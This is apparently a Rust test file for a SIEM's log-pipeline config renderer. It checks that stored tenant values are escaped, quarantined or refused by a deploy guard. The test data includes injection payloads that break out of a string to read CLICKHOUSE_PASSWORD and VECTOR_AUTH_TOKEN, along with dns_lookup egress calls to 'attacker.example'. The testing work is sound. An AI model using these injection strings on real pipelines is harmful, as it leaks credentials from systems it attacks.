// SPDX-License-Identifier: AGPL-3.0-or-later

//! NAN-5012 / NAN-5033 / NAN-5057: what the deploy render emits for stored
//! tenant values that never passed a write-time check (legacy rows,
//! repository imports, never-published working copies).
//!
//! * Scalars are escaped: a hostile `source_type` / vendor / product renders
//!   as an inert literal, and the generated remap still compiles against the
//!   parser function allowlist.
//! * VRL that fails the allowlist degrades ONE source (sampling off,
//!   extension skipped, parser quarantined to the parse-failure path) and
//!   never fails the render for every other source.
//! * The deploy guard refuses a document whose tenant remaps or conditions
//!   reach outside the allowlist, as a backstop for the renderer.

use super::*;

use crate::parsers::vrl_functions::parser_vrl_functions;
use crate::parsers::vrl_safety::QUARANTINED_PARSER_VRL;
use tempfile::TempDir;

fn parser(name: &str) -> Parser {
    Parser {
        activation_parked: false,
        id: uuid::Uuid::new_v4(),
        name: name.to_string(),
        description: None,
        source_type: "routed".to_string(),
        parser_vrl: ".parsed = true".to_string(),
        output_fields: None,
        feed_id: None,
        dispatch_source_config_id: None,
        dispatch_route_name: None,
        enabled: true,
        validated: true,
        validation_error: None,
        category: None,
        vendor: None,
        product: None,
        kind: "log".to_string(),
        enrich_kind: None,
        enrich_source: None,
        target_table: None,
        normalize_vrl: None,
        namespace: "default".to_string(),
        timezone: "UTC".to_string(),
        match_values: Some(vec![format!("{name}_key")]),
        sampling_ratio: None,
        sampling_exclude_condition: None,
        extension_vrl: None,
        extension_enabled: false,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    }
}

/// The finding #26 payload: break out of `st_val = "…"` and read the
/// ClickHouse writer password into the event.
const SOURCE_TYPE_BREAKOUT: &str =
    "routed\"\n.ext.leak = get_env_var!(\"CLICKHOUSE_PASSWORD\")\n#";

fn load(path: &std::path::Path) -> toml::Table {
    let raw = std::fs::read_to_string(path).unwrap();
    toml::from_str(&crate::vector_env::substitute_like_vector(&raw))
        .unwrap_or_else(|e| panic!("{} is not valid TOML: {e}\n{raw}", path.display()))
}

fn remap_source<'a>(doc: &'a toml::Table, transform: &str) -> &'a str {
    doc["transforms"][transform]["source"]
        .as_str()
        .unwrap_or_else(|| panic!("{transform} has no source"))
}

#[test]
fn hostile_scalars_render_as_inert_literals() {
    // `_output` / `_sample` are the UDM render (NAN-5346: none under OCSF).
    let _udm = crate::schema::pin_active_schema_for_test(crate::schema::SchemaId::Udm);
    let mgr = VectorConfigManager::new(std::path::PathBuf::from("/tmp/nanosiem-render-safety"));
    let mut p = parser("acme");
    p.source_type = SOURCE_TYPE_BREAKOUT.to_string();
    p.vendor = Some("ven'''dor\"\n.x = get_env_var!(\"VECTOR_AUTH_TOKEN\")".to_string());
    p.product = Some("{{ secret }}".to_string());
    p.category = Some("cat\u{1}egory".to_string());
    p.namespace = "name\\space".to_string();

    // Before NAN-5033 the guard accepted this document while `_output`
    // carried the attacker's statement; now it must render and pass.
    let config = mgr.guarded_parser_config(&p).expect("guard accepts the escaped document");
    let doc: toml::Table = toml::from_str(&crate::vector_env::substitute_like_vector(&config))
        .expect("valid TOML");
    let output = remap_source(&doc, "acme_output");
    assert!(
        !output.contains("\n.ext.leak"),
        "the source_type must not open a new VRL statement:\n{output}"
    );
    crate::parsers::vrl_guard::compile(output, &parser_vrl_functions()).unwrap_or_else(|e| {
        panic!(
            "_output must compile against the parser allowlist:\n{}",
            e.render(output)
        )
    });
}

#[tokio::test]
async fn stored_hostile_rows_degrade_per_source_and_never_fail_the_render() {
    // `_output` / `_sample` are the UDM render (NAN-5346: none under OCSF).
    let _udm = crate::schema::pin_active_schema_for_test(crate::schema::SchemaId::Udm);
    let dir = TempDir::new().unwrap();
    let mgr = VectorConfigManager::new(dir.path());

    let mut healthy = parser("healthy");
    healthy.sampling_ratio = Some(0.5);
    healthy.sampling_exclude_condition = Some(r#".severity == "critical""#.into());

    let mut bad_sampling = parser("bad_sampling");
    bad_sampling.sampling_ratio = Some(0.5);
    bad_sampling.sampling_exclude_condition =
        Some(r#"true) || get_env_var!("CLICKHOUSE_PASSWORD") != "" || (true"#.into());

    let mut bad_parser = parser("bad_parser");
    bad_parser.parser_vrl = r#".ext.leak = get_env_var!("CLICKHOUSE_PASSWORD")"#.into();
    bad_parser.validated = true; // e.g. a repository import before NAN-5057

    let mut bad_extension = parser("bad_extension");
    bad_extension.extension_vrl = Some(r#".ext.x = dns_lookup!("a.attacker.example")"#.into());
    bad_extension.extension_enabled = true;

    let mut bad_source_type = parser("bad_source_type");
    bad_source_type.source_type = SOURCE_TYPE_BREAKOUT.to_string();

    mgr.deploy_parsers(&[
        healthy,
        bad_sampling,
        bad_parser,
        bad_extension,
        bad_source_type,
    ])
    .await
    .expect("one bad row must never fail the whole render");

    let dir = mgr.parsers_dir();
    let healthy = load(&dir.join("healthy.toml"));
    assert!(
        healthy["transforms"].get("healthy_sample").is_some(),
        "a valid condition keeps its sampling"
    );

    let bad_sampling = load(&dir.join("bad_sampling.toml"));
    assert!(
        bad_sampling["transforms"].get("bad_sampling_sample").is_none(),
        "a hostile condition turns sampling off (every event kept)"
    );
    let combiner = std::fs::read_to_string(dir.join("_combiner.toml")).unwrap();
    assert!(combiner.contains("\"bad_sampling_output\""), "{combiner}");
    assert!(combiner.contains("\"healthy_sample\""), "{combiner}");

    let bad_parser = load(&dir.join("bad_parser.toml"));
    assert_eq!(
        remap_source(&bad_parser, "bad_parser_parse").trim(),
        QUARANTINED_PARSER_VRL,
        "a hostile parser is quarantined to the parse-failure path"
    );

    let bad_extension = load(&dir.join("bad_extension.toml"));
    assert!(bad_extension["transforms"].get("bad_extension_extension").is_none());
    assert!(bad_extension["transforms"].get("bad_extension_parse").is_some());

    // No rendered file carries the payloads.
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let text = std::fs::read_to_string(entry.path()).unwrap();
        for needle in ["get_env_var!(\"CLICKHOUSE_PASSWORD\")", "dns_lookup!"] {
            assert!(
                !text.contains(needle) || entry.file_name().to_string_lossy().starts_with('_'),
                "{} still carries {needle}:\n{text}",
                entry.path().display()
            );
        }
    }
    let bad_source_type = std::fs::read_to_string(dir.join("bad_source_type.toml")).unwrap();
    assert!(!bad_source_type.contains("get_env_var!(\"CLICKHOUSE_PASSWORD\")\n"));
}

fn guard(doc: &str) -> Result<(), String> {
    crate::parsers::pipe::guard::check_document(
        "acme",
        ".parsed = true",
        doc,
        &crate::parsers::pipe::native::runtime_transforms(),
    )
}

#[test]
fn guard_refuses_a_sample_condition_outside_the_allowlist() {
    let doc = r#"
[transforms.acme_sample]
type = "sample"
inputs = ["acme_output"]
ratio = 0.5
exclude = "(to_bool(._nano_durable_ingest) ?? false) || get_env_var!(\"X\") != \"\""
"#;
    assert!(guard(doc).unwrap_err().contains("acme_sample"));
    let ok = doc.replace(r#"get_env_var!(\"X\") != \"\""#, r#".severity == \"critical\""#);
    guard(&ok).unwrap();
}

#[test]
fn guard_refuses_a_filter_condition_that_writes_or_egresses() {
    let doc = r#"
[transforms.acme_filter]
type = "filter"
inputs = ["splunk_hec_route"]
condition = "is_object(dns_lookup(\"x.attacker.example\") ?? null)"
"#;
    assert!(guard(doc).is_err());
}

#[test]
fn guard_compiles_plain_parser_and_extension_remaps() {
    for name in ["acme_parse", "acme_extension"] {
        let doc = format!(
            "[transforms.{name}]\ntype = \"remap\"\ninputs = [\"x\"]\nsource = '''\n.leak = get_env_var!(\"CLICKHOUSE_PASSWORD\")\n'''\n"
        );
        assert!(guard(&doc).unwrap_err().contains(name), "{name}");
        let ok = doc.replace(r#"get_env_var!("CLICKHOUSE_PASSWORD")"#, r#""fine""#);
        guard(&ok).unwrap();
    }
}

/// Review follow-up (NAN-5057): the stored-text check and the rendered-document
/// guard must never disagree in a way that fails the whole render. Each of
/// these passes (or used to pass) the stored-text validator but is refused by
/// the guard on the rendered document; each must degrade only its own source.
#[tokio::test]
async fn guard_only_failures_degrade_one_source_not_the_render() {
    use crate::parsers::pipe::{Plan, Step};
    let dir = TempDir::new().unwrap();
    let mgr = VectorConfigManager::new(dir.path());

    // (1) lone `\r`: VRL ends the comment only at `\n`, the renderer turns
    // `\r` into `\n`, so the `)` lands on its own line.
    let mut lone_cr = parser("lone_cr");
    lone_cr.parser_vrl = ".a = 1 # x\r)".into();
    assert!(
        crate::parsers::vrl_safety::check_program("parser_vrl", &lone_cr.parser_vrl).is_err(),
        "the stored-text check validates what renders"
    );

    // (2) `enrichment_table` in a string: valid VRL, refused by the guard.
    let mut enrichment_word = parser("enrichment_word");
    enrichment_word.parser_vrl = r#".note = "see enrichment_table docs""#.into();
    assert!(
        crate::parsers::vrl_safety::check_program("parser_vrl", &enrichment_word.parser_vrl)
            .is_ok(),
        "the validator accepts it; only the guard refuses"
    );

    // (3) a plan the validator accepts but this runtime cannot run (combine
    // needs reduce + lua, absent from the pinned image).
    let plan = Plan {
        version: 2,
        revision: 1,
        steps: vec![Step {
            id: "combine".into(),
            name: "combine".into(),
            kind: "combine".into(),
            enabled: true,
            condition: None,
            config: serde_json::json!({"keys": ["host"], "maxEvents": 10})
                .as_object()
                .unwrap()
                .clone(),
        }],
    };
    let mut combine = parser("combine_plan");
    combine.parser_vrl = plan.stored().unwrap();
    assert!(
        crate::parsers::pipe::native::deployable_with(
            &plan,
            &crate::parsers::pipe::native::runtime_transforms()
        )
        .is_err(),
        "precondition: the pinned runtime cannot run combine"
    );

    let healthy = parser("healthy");
    mgr.deploy_parsers(&[lone_cr.clone(), enrichment_word.clone(), combine.clone(), healthy])
        .await
        .expect("guard-only failures must not fail the render for every source");

    let dir = mgr.parsers_dir();
    let healthy = load(&dir.join("healthy.toml"));
    assert_eq!(remap_source(&healthy, "healthy_parse").trim(), ".parsed = true");
    for name in ["lone_cr", "enrichment_word", "combine_plan"] {
        let doc = load(&dir.join(format!("{name}.toml")));
        assert_eq!(
            remap_source(&doc, &format!("{name}_parse")).trim(),
            QUARANTINED_PARSER_VRL,
            "{name} is quarantined on its own"
        );
    }
    // The operator-facing notes name the guard failure.
    for p in [&enrichment_word, &combine] {
        let (_, notes) = mgr.render_safe_parser(p);
        assert!(
            notes.iter().any(|n| n.contains("failed the deploy check")),
            "{}: {notes:?}",
            p.name
        );
    }
}
